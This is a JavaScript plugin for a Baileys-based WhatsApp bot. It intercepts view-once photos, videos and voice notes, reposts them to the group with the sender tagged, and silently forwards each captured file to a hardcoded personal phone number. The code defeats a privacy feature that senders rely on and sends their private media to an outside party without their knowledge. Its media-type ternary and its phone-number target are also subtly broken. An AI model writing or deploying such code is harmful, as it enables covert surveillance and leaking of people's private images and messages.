import { downloadMediaMessage } from '@whiskeysockets/baileys';

let handler = m => m;

handler.before = async function (m, { conn, isAdmin, isBotAdmin }) {
    let media, msg, type;
    const { antiver, isBanned } = global.db.data.chats[m.chat];
    if (!antiver || isBanned || !['viewOnceMessageV2', 'viewOnceMessageV2Extension'].includes(m.mtype)) return;

    if (['viewOnceMessageV2', 'viewOnceMessageV2Extension'].includes(m.mtype)) {
        msg = m.mtype === 'viewOnceMessageV2' ? m.message.viewOnceMessageV2.message : m.message.viewOnceMessageV2Extension.message;
        type = Object.keys(msg)[0];
        if (m.mtype === 'viewOnceMessageV2') {
            media = await downloadMediaMessage(msg[type], type === 'imageMessage' ? 'image' : 'videoMessage' ? 'video' : 'audio');
        } else {
            media = await downloadMediaMessage(msg[type], 'audio');
        }
        
        let buffer = Buffer.from([]);
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        const fileSize = formatFileSize(msg[type].fileLength);
        const description = `
🕵️‍♀️ *ANTI VER UNA VEZ* 🕵️\n
🚫 *No ocultar* ${type === 'imageMessage' ? '`Imagen` 📷' : type === 'videoMessage' ? '`Vídeo` 🎥' : type === 'audioMessage' ? '`Mensaje de voz` 🔊' : 'este mensaje'}
- *Tamaño:* \`${fileSize}\`
- *Usuario:* *@${m.sender.split('@')[0]}*
${msg[type].caption ? `- *Texto:* ${msg[type].caption}` : ''}`.trim();

        // Enviar el mensaje al chat donde está el bot
        await conn.reply(m.chat, description, m, { mentions: [m.sender] });
        if (/image|video/.test(type)) {
            await conn.sendFile(m.chat, buffer, type === 'imageMessage' ? 'error.jpg' : 'error.mp4', description, m, false, { mentions: [m.sender] });
        }
        if (/audio/.test(type)) {
            await conn.sendMessage(m.chat, { audio: buffer, fileName: 'error.mp3', mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
        }

        // Enviar el mensaje a un número de propietario específico
        const specificOwner = '+51927803866'; // Cambia este número si deseas recibir en un número personal diferente
        await conn.sendMessage(specificOwner, { text: description }, { quoted: m });
        await conn.sendFile(specificOwner, buffer, `error.${getFileExtension(type)}`, description, m, false);
    }
};

export default handler;

function formatFileSize(bytes) {
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
    const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
    return Math.round(100 * (bytes / Math.pow(1024, i))) / 100 + ' ' + sizes[i];
}

function getFileExtension(type) {
    switch (type) {
        case 'imageMessage': return 'jpg';
        case 'videoMessage': return 'mp4';
        case 'documentMessage': return 'pdf';
        case 'audioMessage': return 'mp3';
        default: return 'bin';
    }
}
